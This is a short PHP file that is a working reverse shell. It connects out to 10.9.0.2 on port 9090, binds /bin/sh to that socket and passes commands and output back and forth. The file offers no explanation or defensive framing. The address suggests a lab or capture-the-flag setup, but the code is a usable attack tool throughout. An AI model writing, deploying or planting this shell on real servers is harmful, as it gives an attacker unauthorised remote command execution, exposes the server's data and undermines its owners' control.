<?php

$ip = '10.9.0.2';
$port = 9090;

$sock = fsockopen($ip, $port);

$descriptorspec = array(
   0 => $sock, // stdin
   1 => $sock, // stdout
   2 => $sock  // stderr
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);

if (is_resource($process)) {
    while ($sock && !feof($sock)) {
        $read = array($sock, $pipes[1], $pipes[2]);
        $write = NULL;
        $except = NULL;

        if (stream_select($read, $write, $except, 0) > 0) {
            foreach ($read as $sockread) {
                if ($sockread === $sock) {
                    $input = fread($sock, 1024);
                    fwrite($pipes[0], $input);
                } else {
                    $output = fread($sockread, 1024);
                    fwrite($sock, $output);
                }
            }
        }
    }
    fclose($sock);
    proc_close($process);
}

?>

